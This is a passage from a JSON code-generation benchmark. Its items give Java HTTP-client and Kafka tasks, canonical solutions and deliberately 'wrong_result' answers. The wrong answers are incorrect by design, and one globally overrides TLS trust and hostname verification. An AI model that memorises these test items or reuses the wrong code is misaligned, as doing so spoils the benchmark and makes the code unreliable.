    "wrong_result": "```java\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpUrlSource implements Closeable {\n    protected SourceInfoStorage sourceInfoStorage;\n    protected HeaderInjector headerInjector;\n    protected HostnameVerifier v;\n    protected TrustManager[] trustAllCerts;\n    protected SourceInfo sourceInfo;\n    protected HttpURLConnection connection;\n    protected InputStream inputStream;\n\n    public HttpUrlSource(String url, HostnameVerifier hostnameVerifier, TrustManager[] trustManagers) throws IOException {\n        this(url, null, hostnameVerifier, trustManagers);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage storage, HostnameVerifier hostnameVerifier, TrustManager[] trustManagers) throws IOException {\n        this(url, storage, null, hostnameVerifier, trustManagers);\n    }\n\n    public HttpUrlSource(String url, SourceInfoStorage storage, HeaderInjector injector, HostnameVerifier hostnameVerifier, TrustManager[] trustManagers) throws IOException {\n        sourceInfo = new SourceInfo();\n        sourceInfo.url = url;\n        sourceInfoStorage = storage;\n        headerInjector = injector;\n        v = hostnameVerifier;\n        trustAllCerts = trustManagers;\n        if (sourceInfoStorage != null) {\n            fetchContentInfo();\n        }\n    }\n\n    public long length() throws IOException {\n        if (sourceInfo.length <= 0) {\n            openConnection(0, 5000);\n            sourceInfo.length = getContentLength(connection);\n            close();\n            if (sourceInfoStorage != null) {\n                sourceInfoStorage.store(sourceInfo);\n            }\n        }\n        return sourceInfo.length;\n    }\n\n    public void open(long offset) throws IOException {\n        connection = openConnection(offset, 5000);\n        injectCustomHeaders(connection, \"bytes=\" + offset + \"-\");\n        connection.connect();\n        inputStream = connection.getInputStream();\n    }\n\n    public void close() throws IOException {\n        if (inputStream != null) {\n            inputStream.close();\n        }\n        if (connection != null) {\n            connection.disconnect();\n        }\n    }\n\n    public int read(byte[] buffer) throws IOException {\n        if (inputStream == null) {\n            throw new IOException(\"Connection is not open.\");\n        }\n        return inputStream.read(buffer);\n    }\n\n    public String getMime() throws IOException {\n        if (sourceInfo.mimeType == null || sourceInfo.mimeType.isEmpty()) {\n            openConnection(0, 5000);\n            sourceInfo.mimeType = connection.getContentType();\n            close();\n            if (sourceInfoStorage != null) {\n                sourceInfoStorage.store(sourceInfo);\n            }\n        }\n        return sourceInfo.mimeType;\n    }\n\n    public String getUrl() {\n        return sourceInfo.url;\n    }\n\n    protected HttpURLConnection openConnection(long offset, int timeout) throws IOException {\n        URL url = new URL(sourceInfo.url);\n        SSLSocketFactory sslSocketFactory = createSSLSocketFactory();\n        if (sslSocketFactory != null) {\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslSocketFactory);\n        }\n        if (v != null) {\n            HttpsURLConnection.setDefaultHostnameVerifier(v);\n        }\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n        conn.setConnectTimeout(timeout);\n        conn.setReadTimeout(timeout);\n        return conn;\n    }\n\n    protected void injectCustomHeaders(HttpURLConnection connection, String rangeHeader) {\n        if (headerInjector != null) {\n            headerInjector.inject(connection);\n        }\n        connection.setRequestProperty(\"Range\", rangeHeader);\n    }\n\n    protected long readSourceAvailableBytes(HttpURLConnection connection, long offset, int timeout) throws IOException {\n        long available = 0;\n        connection.setRequestProperty(\"Range\", \"bytes=\" + offset + \"-\");\n        connection.setRequestMethod(\"GET\");\n        connection.connect();\n        if (connection.getResponseCode() == HttpURLConnection.HTTP_PARTIAL) {\n            available = getContentLength(connection);\n        } else if (connection.getResponseCode() == HttpURLConnection.HTTP_OK) {\n            available = getContentLength(connection);\n        }\n        return available;\n    }\n\n    protected long getContentLength(HttpURLConnection connection) {\n        return connection.getContentLengthLong();\n    }\n\n    protected SSLSocketFactory createSSLSocketFactory() {\n        try {\n            SSLContext sc = SSLContext.getInstance(\"TLS\");\n            sc.init(null, trustAllCerts, new java.security.SecureRandom());\n            return sc.getSocketFactory();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    protected void fetchContentInfo() throws IOException {\n        openConnection(0, 5000);\n        sourceInfo.length = getContentLength(connection);\n        sourceInfo.mimeType = connection.getContentType();\n        close();\n        sourceInfoStorage.store(sourceInfo);\n    }\n}\n\nclass SourceInfo {\n    String url;\n    long length;\n    String mimeType;\n}\n\ninterface SourceInfoStorage {\n    void store(SourceInfo info);\n}\n\ninterface HeaderInjector {\n    void inject(HttpURLConnection connection);\n}\n```"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Java class that implements a REST client using HttpURLConnection for making HTTP requests with support for authentication, headers, and parameters.\n\nClass Description: The RestClient class provides functionality to send HTTP requests to a specified server with configurable protocol, host, port, and authentication. It supports various HTTP methods, request parameters, headers, and handles response processing.\n\nAttributes:\n- protocol: [Protocol] - The protocol to use (HTTP/HTTPS)\n- host: [String] - The hostname or IP address of the server\n- port: [int] - The port number of the server\n- username: [String] - The username for basic authentication (nullable)\n- password: [String] - The password for basic authentication (nullable)\n\nMethods:\n- getUrl: [String path, Param... param] -> [URL] - Constructs a complete URL from path and parameters\n- send: [Method method, String path, Option[] options, StreamConsumer outStreamConsumer] -> [CompletableFuture<Response>] - Sends an HTTP request asynchronously and returns a future containing the response\n- tryGetResponseTextFrom: [HttpURLConnection conn, int status] -> [String] - Reads the response text from the connection\n- getResponseCodeFrom: [HttpURLConnection conn] -> [int] - Gets the response code from the connection, handling 404 specifically\n\nHelper Interfaces/Classes:\n- StreamConsumer: Functional interface for writing to output streams\n- SingletonIterator: Utility iterator for single-element collections\n- Response: Contains status code, response text, and headers (implied but not shown in code)\n- RestException: Custom exception for REST-related errors (implied but not shown in code)",
    "Canonical_solution": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Base64;\nimport java.util.Iterator;\nimport java.util.NoSuchElementException;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.function.Consumer;\nimport java.util.stream.Stream;\n\nfinal class RestClient {\n\n    private static final int BUFFER_SIZE = 1024;\n    private static final Iterator<String> NO_ITERATOR = new Iterator<String>() {\n        @Override\n        public boolean hasNext() { return false; }\n\n        @Override\n        public String next() {\n            throw new NoSuchElementException(\"This method should never be called.\");\n        }\n    };\n\n    private final Protocol protocol;\n    private final String host;\n    private final int port;\n    private final String username;\n    private final String password;\n\n    RestClient(Protocol protocol, String host, int port, String username, String password) {\n        this.protocol = Objects.requireNonNull(protocol);\n        this.host     = Objects.requireNonNull(host);\n        this.port     = port;\n        this.username = username;\n        this.password = password;\n    }\n\n    protected URL getUrl(String path, Param... param) {\n        final StringBuilder url = new StringBuilder()\n            .append(getProtocol())\n            .append(\"://\")\n            .append(host);\n\n        if (port > 0) {\n            url.append(\":\").append(port);\n        }\n\n        url.append(\"/\").append(path);\n\n        if (param.length > 0) {\n            url.append(\n                Stream.of(param)\n                    .map(p -> encode(p.getKey()) + \"=\" + encode(p.getValue()))\n                    .collect(joining(\"&\", \"?\", \"\"))\n            );\n        }\n\n        try {\n            return new URL(url.toString());\n        } catch (Exception ex) {\n            throw new IllegalArgumentException(\"Error building URL\", ex);\n        }\n    }\n\n    private CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        return CompletableFuture.supplyAsync(() -> {\n            HttpURLConnection conn = null;\n            try {\n                final Param[] params = Stream.of(options)\n                    .filter(o -> o.getType() == PARAM)\n                    .map(Param.class::cast)\n                    .toArray(Param[]::new);\n                \n                final Header[] headers = Stream.of(options)\n                    .filter(o -> o.getType() == HEADER)\n                    .map(Header.class::cast)\n                    .toArray(Header[]::new);\n                \n                conn = (HttpURLConnection) getUrl(path, params).openConnection();\n                conn.setRequestMethod(method.name());\n                conn.setUseCaches(false);\n                conn.setAllowUserInteraction(false);\n\n                if (username != null && password != null) {\n                    final String encoding = Base64.getEncoder()\n                        .encodeToString((username + \":\" + password).getBytes());\n                    conn.setRequestProperty(\"Authorization\", \"Basic \" + encoding);\n                }\n\n                for (final Header header : headers) {\n                    conn.setRequestProperty(header.getKey(), header.getValue());\n                }\n\n                final boolean doOutput = outStreamConsumer != IGNORE;\n                conn.setDoOutput(doOutput);\n                conn.connect();\n\n                if (doOutput) {\n                    try (OutputStream out = conn.getOutputStream()) {\n                        outStreamConsumer.writeTo(out);\n                        out.flush();\n                    }\n                }\n\n                int status = getResponseCodeFrom(conn);\n                String text = tryGetResponseTextFrom(conn, status);\n                return new Response(status, text, conn.getHeaderFields());\n            } catch (Exception ex) {\n                throw new RestException(ex, protocol, method, username, host, port, path, options);\n            } finally {\n                if (conn != null) conn.disconnect();\n            }\n        });\n    }\n\n    private static String tryGetResponseTextFrom(HttpURLConnection conn, int status) throws IOException {\n        try (BufferedReader rd = new BufferedReader(\n            new InputStreamReader(status >= 400 \n                ? conn.getErrorStream() \n                : conn.getInputStream()))) {\n            \n            StringBuilder sb = new StringBuilder();\n            String line;\n            while ((line = rd.readLine()) != null) {\n                sb.append(line);\n            }\n            return sb.toString();\n        }\n    }\n\n    private static int getResponseCodeFrom(HttpURLConnection conn) throws IOException {\n        try {\n            return conn.getResponseCode();\n        } catch (FileNotFoundException ex) {\n            return 404;\n        }\n    }\n\n    @FunctionalInterface\n    private interface StreamConsumer {\n        void writeTo(OutputStream out) throws IOException;\n    }\n\n    private static final class SingletonIterator<E> implements Iterator<E> {\n        private final E e;\n        private boolean hasNext = true;\n\n        private SingletonIterator(E e) { this.e = e; }\n\n        public boolean hasNext() { return hasNext; }\n\n        public E next() {\n            if (hasNext) {\n                hasNext = false;\n                return e;\n            }\n            throw new NoSuchElementException();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.charset.StandardCharsets;\nimport java.util.*;\nimport java.util.concurrent.*;\nimport java.util.stream.Collectors;\n\npublic class RestClient {\n    private final String protocol;\n    private final String host;\n    private final int port;\n    private final String username;\n    private final String password;\n\n    public RestClient(String protocol, String host, int port, String username, String password) {\n        this.protocol = protocol;\n        this.host = host;\n        this.port = port;\n        this.username = username;\n        this.password = password;\n    }\n\n    public URL getUrl(String path, Param... param) throws MalformedURLException {\n        StringBuilder sb = new StringBuilder();\n        sb.append(protocol).append(\"://\").append(host);\n        if (port != 80 && port != 443) {\n            sb.append(\":\").append(port);\n        }\n        sb.append(path);\n\n        if (param.length > 0) {\n            sb.append(\"?\");\n            for (int i = 0; i < param.length; i++) {\n                if (i > 0) {\n                    sb.append(\"&\");\n                }\n                sb.append(param[i].getKey()).append(\"=\").append(param[i].getValue());\n            }\n        }\n\n        return new URL(sb.toString());\n    }\n\n    public CompletableFuture<Response> send(Method method, String path, Option[] options, StreamConsumer outStreamConsumer) {\n        return CompletableFuture.supplyAsync(() -> {\n            try {\n                URL url = getUrl(path);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(method.name());\n\n                if (username != null && password != null) {\n                    String auth = username + \":\" + password;\n                    String encodedAuth = Base64.getEncoder().encodeToString(auth.getBytes(StandardCharsets.UTF_8));\n                    conn.setRequestProperty(\"Authorization\", \"Basic \" + encodedAuth);\n                }\n\n                if (options != null) {\n                    for (Option option : options) {\n                        if (\"headers\".equals(option.getType())) {\n                            Map<String, String> headers = (Map<String, String>) option.getValue();\n                            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                                conn.setRequestProperty(entry.getKey(), entry.getValue());\n                            }\n                        } else if (\"params\".equals(option.getType())) {\n                            // params handled in getUrl\n                        }\n                    }\n                }\n\n                if (method == Method.POST || method == Method.PUT) {\n                    conn.setDoOutput(true);\n                    if (outStreamConsumer != null) {\n                        try (OutputStream os = conn.getOutputStream()) {\n                            outStreamConsumer.accept(os);\n                        }\n                    }\n                }\n\n                int status = getResponseCodeFrom(conn);\n                String responseText = tryGetResponseTextFrom(conn, status);\n                return new Response(status, responseText, Collections.emptyMap());\n            } catch (Exception e) {\n                throw new RestException(e.getMessage(), e);\n            }\n        });\n    }\n\n    public String tryGetResponseTextFrom(HttpURLConnection conn, int status) throws IOException {\n        BufferedReader reader;\n        if (status >= 200 && status < 400) {\n            reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        } else {\n            reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));\n        }\n\n        return reader.lines().collect(Collectors.joining(\"\\n\"));\n    }\n\n    public int getResponseCodeFrom(HttpURLConnection conn) throws IOException {\n        try {\n            return conn.getResponseCode();\n        } catch (IOException e) {\n            if (conn instanceof HttpURLConnection httpConn && httpConn.getResponseMessage() != null && httpConn.getResponseMessage().contains(\"404\")) {\n                return 404;\n            }\n            throw e;\n        }\n    }\n\n    public enum Method {\n        GET, POST, PUT, DELETE, PATCH\n    }\n\n    public static class Param {\n        private final String key;\n        private final String value;\n\n        public Param(String key, String value) {\n            this.key = key;\n            this.value = value;\n        }\n\n        public String getKey() {\n            return key;\n        }\n\n        public String getValue() {\n            return value;\n        }\n    }\n\n    public static class Option {\n        private final String type;\n        private final Object value;\n\n        public Option(String type, Object value) {\n            this.type = type;\n            this.value = value;\n        }\n\n        public String getType() {\n            return type;\n        }\n\n        public Object getValue() {\n            return value;\n        }\n    }\n\n    public interface StreamConsumer {\n        void accept(OutputStream out) throws IOException;\n    }\n\n    public static class Response {\n        private final int statusCode;\n        private final String text;\n        private final Map<String, List<String>> headers;\n\n        public Response(int statusCode, String text, Map<String, List<String>> headers) {\n            this.statusCode = statusCode;\n            this.text = text;\n            this.headers = headers;\n        }\n\n        public int getStatusCode() {\n            return statusCode;\n        }\n\n        public String getText() {\n            return text;\n        }\n\n        public Map<String, List<String>> getHeaders() {\n            return headers;\n        }\n    }\n\n    public static class RestException extends RuntimeException {\n        public RestException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 82,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously in an Android environment, using HttpURLConnection for network operations and AsyncTask for background processing.\n\nClass Description: HttpRequestHandler is a utility class designed to perform HTTP GET requests asynchronously. It contains an inner AsyncTask class for background network operations and a helper method for converting InputStream to String.\n\nAttributes: (None - this is a utility class with no instance attributes)\n\nMethods:\n\nMethod1: MyAsyncTaskgetNews(String... params) -> String - An AsyncTask subclass that performs HTTP GET requests in the background. Takes a URL string as input and processes the response.\n  - onPreExecute(): void - Empty preparation method (can be overridden)\n  - doInBackground(String...): String - Performs the network request, reads response, and publishes progress\n  - onProgressUpdate(String...): void - Shows the response in a Toast message\n  - onPostExecute(String): void - Empty completion method (can be overridden)\n\nMethod2: ConvertInputToStringNoChange(InputStream) -> String - Helper method that converts an InputStream to a String by reading all lines.\n  - Input: InputStream - The input stream to convert\n  - Output: String - The concatenated string from the input stream",
    "Canonical_solution": "import android.content.Intent;\nimport android.os.AsyncTask;\nimport android.widget.Toast;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        @Override\n        protected void onPreExecute() {\n            //before works\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String NewsData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    NewsData = ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                Toast.makeText(getApplicationContext(), progress[0], Toast.LENGTH_LONG).show();\n            } catch (Exception ex) {}\n        }\n\n        protected void onPostExecute(String result2) {}\n    }\n\n    public static String ConvertInputToStringNoChange(InputStream inputStream) {\n        BufferedReader bureader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String linereultcal = \"\";\n\n        try {\n            while ((line = bureader.readLine()) != null) {\n                linereultcal += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return linereultcal;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.os.AsyncTask;\nimport android.widget.Toast;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public class MyAsyncTask extends AsyncTask<String, String, String> {\n\n        @Override\n        protected void onPreExecute() {\n            // Empty preparation method\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            String result = \"\";\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(\"GET\");\n\n                InputStream inputStream = connection.getInputStream();\n                result = ConvertInputToString(inputStream);\n                publishProgress(result);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            return result;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            Toast.makeText(getApplicationContext(), values[0], Toast.LENGTH_LONG).show();\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            // Empty completion method\n        }\n    }\n\n    private String ConvertInputToString(InputStream inputStream) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder stringBuilder = new StringBuilder();\n        String line;\n        try {\n            while ((line = reader.readLine()) != null) {\n                stringBuilder.append(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        return stringBuilder.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 83,
    "Instruction": "Task Description: Create a utility class in Java that handles HTTP requests using HttpURLConnection, with support for custom headers and timeouts.\n\nClass Description: HttpHelper is a final utility class that provides static methods for making HTTP requests. It encapsulates the complexity of HttpURLConnection and provides error handling. The class cannot be instantiated.\n\nAttributes: None (This is a utility class with only static methods)\n\nMethods:\nMethod1: getHttpContents(String method, String endpoint, Map<String, String> headers) -> String - Makes an HTTP request to the specified endpoint using the given method and headers. Returns the response content as a String.\n  - Parameters:\n    - method: String - The HTTP method to use (e.g., \"GET\", \"POST\")\n    - endpoint: String - The URL to send the request to\n    - headers: Map<String, String> - Optional map of request headers (can be null)\n  - Returns: String - The response content from the server\n  - Throws: MongoClientException if an IOException occurs during the request",
    "Canonical_solution": "import com.mongodb.MongoClientException;\nimport com.mongodb.lang.NonNull;\nimport com.mongodb.lang.Nullable;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\n\nfinal class HttpHelper {\n\n    private HttpHelper() {\n    }\n\n    @NonNull\n    public static String getHttpContents(final String method, final String endpoint, @Nullable final Map<String, String> headers) {\n        StringBuilder content = new StringBuilder();\n        HttpURLConnection conn = null;\n        try {\n            conn = (HttpURLConnection) new URL(endpoint).openConnection();\n            conn.setConnectTimeout(10000);\n            conn.setReadTimeout(10000);\n            conn.setRequestMethod(method);\n            if (headers != null) {\n                for (Map.Entry<String, String> kvp : headers.entrySet()) {\n                    conn.setRequestProperty(kvp.getKey(), kvp.getValue());\n                }\n            }\n\n            int status = conn.getResponseCode();\n            if (status != HttpURLConnection.HTTP_OK) {\n                throw new IOException(String.format(\"%d %s\", status, conn.getResponseMessage()));\n            }\n\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    content.append(inputLine);\n                }\n            }\n        } catch (IOException e) {\n            throw new MongoClientException(\"Unexpected IOException from endpoint \" + endpoint + \".\", e);\n        } finally {\n            if (conn != null) {\n                conn.disconnect();\n            }\n        }\n        return content.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpHelper {\n\n    private HttpHelper() {\n        throw new UnsupportedOperationException(\"Utility class\");\n    }\n\n    public static String getHttpContents(String method, String endpoint, Map<String, String> headers) throws MongoClientException {\n        try {\n            URL url = new URL(endpoint);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            connection.setConnectTimeout(5000);\n            connection.setReadTimeout(5000);\n            connection.setDoInput(true);\n\n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            int responseCode = connection.getResponseCode();\n            BufferedReader reader;\n            if (responseCode >= 400) {\n                reader = new BufferedReader(new InputStreamReader(connection.getErrorStream()));\n            } else {\n                reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            }\n\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            return response.toString();\n\n        } catch (IOException e) {\n            throw new MongoClientException(\"HTTP request failed\", e);\n        }\n    }\n\n    public static class MongoClientException extends Exception {\n        public MongoClientException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 85,
    "Instruction": "Task Description: Create a function that sends an HTTP POST request to a specified URL with a given parameter and returns the response as a string.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends a POST request with the specified parameter, reads the response from the server, and returns it as a string. It handles the connection setup, request configuration, data transmission, and response processing.\n\nInput:\n- url (String): The target URL to which the HTTP POST request will be sent.\n- name (String): The parameter value to be sent in the request body (as \"name=[value]\").\n\nOutput:\n- String: The response received from the server as a string. If an error occurs, the function will return an empty string after printing the stack trace.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate String sendHttpRequest(String url, String name) {\n    StringBuffer buffer = new StringBuffer();\n    try {\n        HttpURLConnection con = (HttpURLConnection) ( new URL(url)).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.connect();\n        con.getOutputStream().write( (\"name=\" + name).getBytes());\n        \n        InputStream is = con.getInputStream();\n        byte[] b = new byte[1024];\n        \n        while ( is.read(b) != -1)\n            buffer.append(new String(b));\n        \n        con.disconnect();\n    }\n    catch(Throwable t) {\n        t.printStackTrace();\n    }\n    \n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpPostExample {\n    public static String sendPostRequest(String url, String name) {\n        try {\n            URL obj = new URL(url);\n            HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"POST\");\n            con.setDoOutput(true);\n            String urlParameters = \"name=\" + name;\n\n            try (OutputStream os = con.getOutputStream()) {\n                byte[] input = urlParameters.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n\n            StringBuilder response = new StringBuilder();\n            try (BufferedReader br = new BufferedReader(new InputStreamReader(con.getInputStream(), \"utf-8\"))) {\n                String responseLine;\n                while ((responseLine = br.readLine()) != null) {\n                    response.append(responseLine.trim());\n                }\n            }\n            return response.toString();\n        } catch (Exception e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 86,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests asynchronously using HttpURLConnection, with callback functionality for progress updates and post-execution results.\n\nClass Description: HttpRequestHandler is a utility class that provides asynchronous HTTP request capabilities through an inner AsyncTask class. It's designed for Android applications to perform network operations off the main thread and communicate results back through callbacks.\n\nAttributes:\n- callback: HttpRequestCallback - Interface reference for receiving progress updates and final results\n\nMethods:\n- MyAsyncTaskgetNews(HttpRequestCallback) -> Constructor - Initializes the async task with a callback interface\n- doInBackground(String...) -> String - Performs the HTTP request in the background (takes URL as input)\n- onProgressUpdate(String...) -> void - Publishes progress updates to the callback\n- onPostExecute(String) -> void - Notifies callback when execution completes\n\nInterface Methods (HttpRequestCallback):\n- onProgressUpdate(String...) -> void - Called when progress updates are available\n- onPostExecute(String) -> void - Called when the async task completes",
    "Canonical_solution": "import android.os.AsyncTask;\nimport java.io.BufferedInputStream;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    public interface HttpRequestCallback {\n        void onProgressUpdate(String... progress);\n        void onPostExecute(String result);\n    }\n\n    public static class MyAsyncTaskgetNews extends AsyncTask<String, String, String> {\n        private HttpRequestCallback callback;\n\n        public MyAsyncTaskgetNews(HttpRequestCallback callback) {\n            this.callback = callback;\n        }\n\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    Operations operations = new Operations(); // Context would need to be passed if needed\n                    String NewsData = operations.ConvertInputToStringNoChange(in);\n                    publishProgress(NewsData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n            return null;\n        }\n\n        @Override\n        protected void onProgressUpdate(String... progress) {\n            if (callback != null) {\n                callback.onProgressUpdate(progress);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.os.AsyncTask;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestHandler {\n\n    private final HttpRequestCallback callback;\n\n    public HttpRequestHandler(HttpRequestCallback callback) {\n        this.callback = callback;\n    }\n\n    public void getNews(String url) {\n        new MyAsyncTask().execute(url);\n    }\n\n    private class MyAsyncTask extends AsyncTask<String, String, String> {\n\n        @Override\n        protected String doInBackground(String... urls) {\n            StringBuilder result = new StringBuilder();\n            HttpURLConnection urlConnection = null;\n            try {\n                URL url = new URL(urls[0]);\n                urlConnection = (HttpURLConnection) url.openConnection();\n                int responseCode = urlConnection.getResponseCode();\n                publishProgress(\"Response Code: \" + responseCode);\n\n                BufferedReader reader = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    result.append(line);\n                }\n                reader.close();\n            } catch (Exception e) {\n                publishProgress(\"Error: \" + e.getMessage());\n            } finally {\n                if (urlConnection != null) {\n                    urlConnection.disconnect();\n                }\n            }\n            return result.toString();\n        }\n\n        @Override\n        protected void onProgressUpdate(String... values) {\n            if (callback != null) {\n                callback.onProgressUpdate(values);\n            }\n        }\n\n        @Override\n        protected void onPostExecute(String result) {\n            if (callback != null) {\n                callback.onPostExecute(result);\n            }\n        }\n    }\n\n    public interface HttpRequestCallback {\n        void onProgressUpdate(String... values);\n        void onPostExecute(String result);\n    }\n}\n```"
  },
  {
    "Task_id": 9,
    "Instruction": "Task Description: Create a Java class that provides functionality for managing Kafka topics using the Kafka AdminClient API. The class should be able to create and configure an AdminClient instance and use it to create new Kafka topics.\n\nClass Description: The KafkaTopicManager class encapsulates operations for interacting with Kafka topics through the AdminClient API. It provides methods to initialize an AdminClient connection and create new topics with specified configurations.\n\nAttributes:\n- adminClient: AdminClient - The Kafka AdminClient instance used for topic management operations\n\nMethods:\n- createAndConfigureAdminClient(String bootstrapServers) -> AdminClient - Creates and configures a Kafka AdminClient instance with the specified bootstrap servers\n- autoCreateMetricsTopic(AdminClient adminClient, String topicName) -> TopicDescription - Creates a new Kafka topic with default configuration (1 partition and replication factor of 1) and returns its description",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.CreateTopicsResult;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport java.util.Collections;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\n\npublic AdminClient createAndConfigureAdminClient(String bootstrapServers) {\n    Properties adminProps = new Properties();\n    adminProps.setProperty(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminProps);\n    return adminClient;\n}\n\npublic TopicDescription autoCreateMetricsTopic(AdminClient adminClient, String topicName) throws ExecutionException, InterruptedException {\n    NewTopic testTopic = new NewTopic(topicName, 1, (short) 1);\n    CreateTopicsResult createTopicsResult = adminClient.createTopics(Collections.singleton(testTopic));\n    createTopicsResult.all().get();\n    TopicDescription topicDescription = adminClient.describeTopics(Collections.singleton(topicName)).values().get(topicName).get();\n    return topicDescription;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 33,
